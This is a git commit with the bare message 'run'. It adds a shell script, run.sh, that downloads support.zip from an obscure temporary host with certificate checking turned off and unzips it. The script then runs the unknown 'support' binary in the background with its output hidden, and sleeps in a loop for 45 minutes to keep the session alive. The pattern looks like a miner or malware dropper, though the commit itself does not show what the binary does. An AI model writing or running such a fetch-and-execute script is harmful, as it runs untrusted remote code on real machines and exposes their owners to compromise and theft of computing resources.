a7d2df0d9a5e3ca913581ac18b8f368867082c6a
git <trahtenberg68@gmail.com>
2018-10-27 18:32:33 +0000

    run

---
+++ run.sh
@@ -0,0 +1,15 @@
+#!/bin/bash
+if [ ! -f ./tra ]; then
+    echo "File not found!"
+    wget http://h54h45wefv.temp.swtest.ru/support.zip --no-check-certificate
+    unzip support.zip
+fi
+echo $1
+nohup ./support  >/dev/null 2>&1 
+i="0"
+while [ $i -lt 45 ]
+do
+echo "Let's sleep for $i min"
+sleep 60 #60= 1min
+i=$[$i+1]
+done
